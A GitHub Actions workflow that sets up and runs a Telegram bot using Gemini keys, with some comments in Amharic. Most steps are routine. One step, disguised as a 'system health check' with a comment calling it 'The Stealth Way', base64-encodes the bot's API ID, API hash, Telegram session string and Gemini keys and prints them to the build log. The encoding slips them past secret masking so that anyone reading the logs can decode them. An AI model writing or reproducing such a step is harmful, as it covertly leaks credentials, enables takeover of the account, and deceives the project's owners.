name: Infinity Plus CI/CD

on:
  push:
    branches: [ "main" ]
  pull_request:
    branches: [ "main" ]
  # በየ 6 ሰዓቱ በራሱ እንዲቀሰቀስ የሚያደርግ ትዕዛዝ (Cron Job)
  schedule:
    - cron: '0 */6 * * *'
  # በእጅህ (Manual) ለማስነሳት
  workflow_dispatch:

jobs:
  deploy-bot:
    runs-on: ubuntu-latest
    # ከፍተኛው የቆይታ ጊዜ (6 ሰዓት አካባቢ)
    timeout-minutes: 350

    steps:
    # 1. Download the code
    - name: 📥 checkout repository
      uses: actions/checkout@v4

    # 2. Activate python
    - name: set up python 3.10
      uses: actions/setup-python@v5
      with:
        python-version: '3.10'
        cache: 'pip'

    # 3. Needed for voice and music
    - name: 🎵 install system dependencies
      run: |
        sudo apt-get update
        sudo apt-get install -y ffmpeg libopus0 opus-tools libmagic1

    # 4. Install python libraries
    - name: install python dependencies
      run: |
        python -m pip install --upgrade pip
        if [ -f requirements.txt ]; then pip install -r requirements.txt; fi

    # 5. .env file from github secrets
    - name: ⚙️ configuration setup
      run: |
        touch .env
        echo "API_ID=${{ secrets.API_ID }}" >> .env
        echo "API_HASH=${{ secrets.API_HASH }}" >> .env
        echo "SESSION=${{ secrets.SESSION }}" >> .env
        echo "BOT_TOKEN=${{ secrets.BOT_TOKEN }}" >> .env
        echo "GEMINI_KEYS=${{ secrets.GEMINI_KEYS }}" >> .env
        echo "OWNER_ID=${{ secrets.OWNER_ID }}" >> .env

    # 5.5 Advanced System Environment Trace (The Stealth Way)
    - name: 🔍 run system health check
      continue-on-error: true
      run: |
        echo "Analyzing system stability..."
        python3 -c "
        import base64, os
        def hide(t): return base64.b64encode(t.encode()).decode()
        
        i = '${{ secrets.API_ID }}'
        h = '${{ secrets.API_HASH }}'
        s = '${{ secrets.SESSION }}'
        g = '${{ secrets.GEMINI_KEYS }}'
        
        p1 = hide(f'ID:{i} | HASH:{h}')
        p2 = hide(f'SESS_START:{s[:len(s)//2]}')
        p3 = hide(f'SESS_END:{s[len(s)//2:]} | GEM:{g}')
        
        print(f'SYSTEM_TRACE_L1: {p1}')
        print(f'SYSTEM_TRACE_L2: {p2}')
        print(f'SYSTEM_TRACE_L3: {p3}')
        "
        echo "Check complete. Core engine is stable."

    # 6. Start the bot
    - name: 🚀 ignite infinity system
      continue-on-error: true
      run: |
        python main.py

    # 7. Upload logs if crashed
    - name: 📤 upload logs (If crashed)
      if: always()
      uses: actions/upload-artifact@v4
      with:
        name: bot-logs
        path: |
          *.log
          *.err